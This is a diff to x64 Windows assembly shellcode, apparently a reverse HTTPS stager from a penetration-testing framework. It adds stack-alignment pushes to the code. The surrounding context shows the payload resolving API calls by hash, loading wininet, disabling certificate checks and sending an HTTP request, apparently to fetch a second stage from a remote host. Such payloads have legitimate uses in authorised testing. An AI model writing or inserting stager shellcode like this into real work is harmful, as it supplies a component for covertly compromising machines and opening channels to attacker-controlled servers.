@@ -1,6 +1,7 @@
 ;-----------------------------------------------------------------------------;
 ; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
 ; Rewritten for x64 by agix
+; Modified to account for memory alignment by rwincey
 ; Compatible: Windows 7
 ; Architecture: x64
 ;-----------------------------------------------------------------------------;
@@ -12,6 +13,7 @@
 
 load_wininet:
   ; setup the structures we need on the stack...
+  push byte 0            ; alignment
   mov r14, 'wininet'
   push r14               ; Push the bytes 'wininet',0 onto the stack.
   mov r14, rsp           ; save pointer to the "wininet" string for LoadLibraryA call.
@@ -20,6 +22,7 @@ load_wininet:
   call rbp               ; LoadLibraryA( "ws2_32" )
 
 internetopen:
+  push byte 0            ; alignment
   push byte 0            ; NULL pointer
   mov rcx, rsp           ; LPCTSTR lpszAgent ("\x00")
   xor rdx, rdx           ; DWORD dwAccessType (PRECONFIG = 0)
@@ -74,6 +77,7 @@ retry:
 internetsetoption:
   mov rcx, rsi           ; HINTERNET hInternet
   mov rdx, 31            ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+  push byte 0            ; alignment
   push qword 0x00003380
     ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
     ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
@@ -90,6 +94,7 @@ httpsendrequest:
   xor rdx, rdx           ; LPCTSTR lpszHeaders
   xor r8, r8             ; DWORD dwHeadersLength
   xor r9, r9             ; LPVOID lpOptional
+  push rdx               ; alignment
   push rdx               ; DWORD dwOptionalLength
   mov r10, 0x7B18062D    ; hash( "wininet.dll", "HttpSendRequestA" )
   call rbp
